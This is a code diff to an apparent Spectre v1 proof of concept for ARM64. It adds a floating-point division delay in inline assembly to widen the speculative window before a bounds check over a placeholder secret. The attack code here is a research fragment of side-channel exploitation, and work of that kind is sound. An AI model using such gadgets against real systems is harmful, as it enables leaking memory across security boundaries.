@@ -47,6 +47,8 @@ uint8_t *reloadbuffer;
 char *secret = "123457812345678";
 static volatile uint8_t pick = 0; 
 uint64_t dummy[100] = {0};
+double num = 3.1415926;
+double divi = 1.1234567;
 
 /*
  * Measure the latency: check whether dco kicks in
@@ -86,9 +88,16 @@ static inline __attribute__((always_inline)) void measure_time() {
 static inline  __attribute__((always_inline)) void spectre_v1( size_t index) {
 	//size[0] = 0;
 	//pick = size[0];
-	unsigned char branch;
+	unsigned char branch = 16;
 	pick = *size_ptr;
 	isb();
+	asm volatile(
+		"ldr d0, %[num]\n\r"
+		"ldr d1, %[div]\n\r"
+		"mov x10, #0\n\r"
+		::[num] "m" (num), [div] "m" (divi)
+		:"d0", "d1", "x10", "memory"
+	);
 	pick = cachemiss;
 	//size[0] = 0;
 	//size = 16;
@@ -98,13 +107,18 @@ static inline  __attribute__((always_inline)) void spectre_v1( size_t index) {
 	//branch = **size_ptr_ptr;
 	asm volatile (
     	"mov x0, %0\n\r"  
-		"ldr x0, [x0]\n\r"
-		"mov x10, x10\n\r"
-		"ldr x0, [x0]\n\r"
-		"mov x10, x10\n\r"
+		"fdiv d0, d0, d1\n\r"
+		"fcvtzs x2, d0\n\r"
+		"mul x2, x2, x10\n\r"
+//		"mov x2, #0\n\r"
+		"adds x0, x0, x2\n\r"
+//		"ldr x0, [x0]\n\r"
+//		"mov x10, x10\n\r"
+//		"ldr x0, [x0]\n\r"
+//		"mov x10, x10\n\r"
 		"ldr %0, [x0]\n\r"
     	: "=r" (branch)
-    	: "r" (&size_ptr_ptr) 
+    	: "r" (&size) 
     	: "x0"                
 	);
 	if (index < branch)
